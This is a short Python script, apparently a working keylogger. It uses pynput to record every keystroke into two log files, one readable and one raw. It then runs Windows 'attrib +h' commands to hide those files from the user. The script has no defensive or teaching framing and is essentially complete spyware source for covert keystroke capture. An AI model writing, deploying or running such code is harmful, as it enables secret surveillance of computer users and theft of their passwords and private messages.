from pynput.keyboard import Key, Listener
import os

# readable format of characters only
readf = open(".keyfile.txt", "a")

# "raw" format of every keypress
rawf = open(".rawfile.txt", "a")

# hide files
os.system("attrib +h .keyfile.txt")
os.system("attrib +h .rawfile.txt")

def on_press(key):
    if key == Key.esc:
        # Stop listener
        readf.close()
        rawf.close()
        return False
    elif key == Key.space:
        readf.write(' ')
        rawf.write(str(key))
    elif key == Key.shift_r or key == Key.shift_l:
        rawf.write(str(key))
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        rawf.write(str(key))
    elif key == Key.enter:
        readf.write('\n')
        rawf.write(str(key) + '\n')
    elif key == Key.backspace:
        readf.write('\b')
        rawf.write(str(key))
    # handling apostrophes
    elif str(key) == '\"\'\"':
        # remove double quotes from apostrophe strings
        readf.write(str(key).replace('\"\'\"', '\''))
        # keep double quotes in raw file
        rawf.write(str(key))
    else:
        # clean up apostrophes from strings
        readf.write(str(key).replace('\'', ''))
        # keep aopstrophes in raw file
        rawf.write(str(key))

# Collect events until released
with Listener(
        on_press=on_press) as listener:
    listener.join()